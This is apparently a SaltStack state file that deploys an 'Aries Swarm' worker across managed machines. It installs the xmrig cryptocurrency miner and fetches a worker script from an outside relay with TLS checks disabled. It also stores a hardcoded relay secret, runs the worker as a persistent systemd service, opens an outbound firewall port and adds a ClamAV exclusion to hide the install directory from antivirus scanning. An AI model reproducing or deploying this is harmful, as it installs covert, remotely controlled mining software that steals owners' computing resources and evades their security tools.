# Aries Swarm Worker — Salt State
{% set relay_url = pillar.get('aries:relay_url', 'https://gateway.doomtrader.com:9700') %}
{% set relay_secret = pillar.get('aries:relay_secret', 'aries-swarm-jdw-2026') %}
{% set sol_wallet = pillar.get('aries:sol_wallet', '') %}
{% set mining_intensity = pillar.get('aries:mining_intensity', 50) %}
{% set install_dir = '/opt/aries-swarm' %}
{% set xmrig_version = '6.25.0' %}

# ── Install Node.js ──
nodejs_repo:
  cmd.run:
    - name: |
        if command -v apt-get >/dev/null 2>&1; then
          curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
        elif command -v yum >/dev/null 2>&1; then
          curl -fsSL https://rpm.nodesource.com/setup_20.x | bash -
        elif command -v apk >/dev/null 2>&1; then
          apk add nodejs npm
        fi
    - unless: node --version | grep -q '^v20'

nodejs_pkg:
  pkg.installed:
    - pkgs:
      - nodejs
      - curl
      - wget
      - unzip
    - require:
      - cmd: nodejs_repo

# ── Directories ──
{{ install_dir }}:
  file.directory:
    - makedirs: True
    - mode: '0755'

{{ install_dir }}/xmrig:
  file.directory:
    - makedirs: True
    - mode: '0755'

{{ install_dir }}/worker:
  file.directory:
    - makedirs: True
    - mode: '0755'

# ── xmrig ──
download_xmrig:
  cmd.run:
    - name: |
        wget -O /tmp/xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v{{ xmrig_version }}/xmrig-{{ xmrig_version }}-linux-static-x64.tar.gz
        tar xzf /tmp/xmrig.tar.gz -C {{ install_dir }}/xmrig/ --strip-components=1
        chmod 755 {{ install_dir }}/xmrig/xmrig
        rm -f /tmp/xmrig.tar.gz
    - unless: test -x {{ install_dir }}/xmrig/xmrig
    - require:
      - file: {{ install_dir }}/xmrig

# ── Worker script ──
download_worker:
  cmd.run:
    - name: curl -sSfk -o {{ install_dir }}/worker/worker-linux.js {{ relay_url }}/api/deploy/worker.js
    - require:
      - file: {{ install_dir }}/worker

# ── Config ──
{{ install_dir }}/worker/env.json:
  file.managed:
    - source: salt://aries-worker/files/env.json.j2
    - template: jinja
    - mode: '0600'
    - context:
        relay_url: {{ relay_url }}
        relay_secret: {{ relay_secret }}
        worker_id: {{ grains['id'] }}
        sol_wallet: {{ sol_wallet }}
        mining_intensity: {{ mining_intensity }}
        install_dir: {{ install_dir }}
    - require:
      - file: {{ install_dir }}/worker

# ── Systemd service ──
/etc/systemd/system/aries-worker.service:
  file.managed:
    - source: salt://aries-worker/files/aries-worker.service.j2
    - template: jinja
    - context:
        install_dir: {{ install_dir }}

aries-worker:
  service.running:
    - enable: True
    - watch:
      - file: /etc/systemd/system/aries-worker.service
      - file: {{ install_dir }}/worker/env.json
      - cmd: download_worker

# ── ClamAV exclusion ──
clamav_exclusion:
  file.append:
    - name: /etc/clamav/clamd.conf
    - text: "ExcludePath ^{{ install_dir }}"
    - onlyif: test -f /etc/clamav/clamd.conf

# ── Firewall ──
firewall_outbound:
  cmd.run:
    - name: which ufw && ufw allow out to any port 9700 proto tcp || true
    - onchanges: []
